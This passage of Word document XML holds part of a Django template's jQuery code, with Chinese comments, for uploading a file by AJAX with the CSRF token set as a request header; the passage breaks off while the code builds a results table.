          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endblock %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C945A44" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68930D11" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="19C05824" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% block js %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="056F3927" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;script src=" https://cdn.jsdelivr.net/jquery.cookie/1.4.1/jquery.cookie.min.js "&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A1520CD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E3354D7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3674E7E6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>var csrftoken = $.cookie('csrftoken');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BDD3265" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>function csrfSafeMethod(method) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A83278B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return (/^(GET|HEAD|OPTIONS|TRACE)$/.test(method));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="091BAE4C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="711B17C1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="25AACD7E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>$(document).ready(function(){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="491DF103" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">   $('#btn').click(function(e){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39E4BAD5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        e.preventDefault();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37C0EE0B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        // </w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>构建</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>FormData</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BB5E45B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>var form_data = new FormData();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C5CB691" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        form_data.append('file', $('#id_file')[0].files[0]);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AFC362D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        form_data.append('upload_method', $('#id_upload_method').val());</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36986D44" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        $.ajax({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17A1577B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        url: '/file/ajax_upload/',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29D7CE3D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        data: form_data,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12EEF093" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        type: 'POST',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="751B356C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        dataType: 'json',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B9CDC8A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        // </w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>告诉</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>jQuery</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>不要去处理发送的数据</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>发送对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52327B4A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>processData : false,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16C38D2A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        // </w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>告诉</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>jQuery</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>不要去设置</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Content-Type</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>请求头</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33520563" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>contentType : false,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20461ECF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">        // </w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>获取</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>所需的</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>csrftoken</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="771B8708" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        beforeSend: function(xhr, settings) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="182DEB4A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            if (!csrfSafeMethod(settings.type) &amp;&amp; !this.crossDomain) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31A0C799" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            xhr.setRequestHeader("X-CSRFToken", csrftoken);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="654FBEA2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            }},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CC6B43E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        success: function (data) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F011083" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            if(data['error_msg']) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B49F02F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                var content = '&lt;li&gt;Only jpg, pdf and xlsx files are allowed.&lt;/li&gt;';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74CA915B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                $('ul.errorlist').html(content);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53D31155" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139B5468" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            else</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65A20958" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7830A633" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            var content= '&lt;thead&gt;&lt;tr&gt;' +</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24002A46" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            '&lt;th&gt;Name and URL&lt;/th&gt;' +</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DF2F38A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            '&lt;th&gt;Size&lt;/th&gt;' +</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CB4CD99" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            '&lt;th&gt;Upload Method&lt;/th&gt;' +</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DEBCCCE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            '&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E5A0B0E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BCEDD98" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">             $.each(data, function(i, item) {</w:t>
      </w:r>
    </w:p>
